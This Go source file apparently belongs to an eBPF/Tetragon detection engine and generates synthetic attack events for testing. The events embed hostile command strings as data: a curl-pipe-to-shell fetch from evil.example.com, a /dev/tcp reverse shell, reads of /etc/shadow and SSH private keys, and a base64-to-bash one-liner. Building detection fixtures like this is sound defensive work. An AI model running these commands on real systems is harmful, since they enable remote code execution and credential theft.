package main

import (
	"context"
	"fmt"
	"time"

	"github.com/cilium/tetragon/api/v1/tetragon"
	"google.golang.org/protobuf/types/known/wrapperspb"

	"github.com/jeffmk/ebpf-poc-engine/internal/eventpipe"
)

// runFake synthesizes a deterministic stream of attack-pattern events
// through the same handlers. It exists so the UI, scoring, SSE, and
// SQLite paths can be exercised end-to-end without a Linux/Tetragon
// host. It runs until ctx is cancelled.
func runFake(ctx context.Context, p *eventpipe.Pipeline) {
	scenarios := []func(seq int, p *eventpipe.Pipeline){
		fakeWebshell,
		fakeReverseShell,
		fakeCredentialTheft,
		fakePrivEsc,
		fakeLOLBin,
	}

	tick := time.NewTicker(4 * time.Second)
	defer tick.Stop()

	seq := 0
	scenarios[seq%len(scenarios)](seq, p)
	seq++

	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
			scenarios[seq%len(scenarios)](seq, p)
			seq++
		}
	}
}

func fakeProcess(execID string, pid, uid uint32, binary, args string) *tetragon.Process {
	return &tetragon.Process{
		ExecId:    execID,
		Pid:       wrapperspb.UInt32(pid),
		Uid:       wrapperspb.UInt32(uid),
		Binary:    binary,
		Arguments: args,
	}
}

func fakeFileArg(path string) *tetragon.KprobeArgument {
	return &tetragon.KprobeArgument{
		Arg: &tetragon.KprobeArgument_FileArg{FileArg: &tetragon.KprobeFile{Path: path}},
	}
}

func fakeIntArg(v int32) *tetragon.KprobeArgument {
	return &tetragon.KprobeArgument{
		Arg: &tetragon.KprobeArgument_IntArg{IntArg: v},
	}
}

func fakeWebshell(seq int, p *eventpipe.Pipeline) {
	parent := fmt.Sprintf("fake-bash-%d", seq)
	child := fmt.Sprintf("fake-curl-%d", seq)
	p.HandleExec(&tetragon.ProcessExec{
		Process: fakeProcess(parent, 1000, 1000, "/bin/bash", "-c 'curl evil.example.com | sh'"),
	})
	p.HandleExec(&tetragon.ProcessExec{
		Process: fakeProcess(child, 1001, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/payload.sh | sh"),
		Parent:  fakeProcess(parent, 1000, 1000, "/bin/bash", ""),
	})
	p.HandleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(child, 1001, 0, "/usr/bin/curl", ""),
		PolicyName: "sensitive-file-access",
		Args:       []*tetragon.KprobeArgument{fakeFileArg("/etc/shadow"), fakeIntArg(4)},
	})
}

func fakeReverseShell(seq int, p *eventpipe.Pipeline) {
	bashID := fmt.Sprintf("fake-rsh-bash-%d", seq)
	p.HandleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 2000, 1000, "/bin/bash", "-c 'exec 3<>/dev/tcp/127.0.0.1/4444'"),
	})
	p.HandleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(bashID, 2000, 1000, "/bin/bash", ""),
		PolicyName: "outbound-connections",
		Args:       []*tetragon.KprobeArgument{},
	})
}

func fakeCredentialTheft(seq int, p *eventpipe.Pipeline) {
	bashID := fmt.Sprintf("fake-cred-bash-%d", seq)
	p.HandleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 3000, 0, "/bin/bash", "-c 'cat /etc/shadow'"),
	})
	for _, target := range []string{"/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa"} {
		p.HandleKprobe(&tetragon.ProcessKprobe{
			Process:    fakeProcess(bashID, 3000, 0, "/bin/bash", ""),
			PolicyName: "sensitive-file-access",
			Args:       []*tetragon.KprobeArgument{fakeFileArg(target), fakeIntArg(4)},
		})
	}
}

func fakePrivEsc(seq int, p *eventpipe.Pipeline) {
	bashID := fmt.Sprintf("fake-priv-bash-%d", seq)
	sudoID := fmt.Sprintf("fake-priv-sudo-%d", seq)
	p.HandleExec(&tetragon.ProcessExec{
		Process: fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
	})
	p.HandleExec(&tetragon.ProcessExec{
		Process: fakeProcess(sudoID, 4001, 1000, "/usr/bin/sudo", "-i"),
		Parent:  fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
	})
	p.HandleKprobe(&tetragon.ProcessKprobe{
		Process:    fakeProcess(sudoID, 4001, 0, "/usr/bin/sudo", ""),
		PolicyName: "privilege-escalation",
		Args:       []*tetragon.KprobeArgument{fakeIntArg(0)},
	})
}

func fakeLOLBin(seq int, p *eventpipe.Pipeline) {
	id := fmt.Sprintf("fake-lol-bash-%d", seq)
	p.HandleExec(&tetragon.ProcessExec{
		Process: fakeProcess(id, 5000, 1000, "/bin/bash", "-c 'echo aGVsbG8K | base64 -d | bash'"),
	})
}
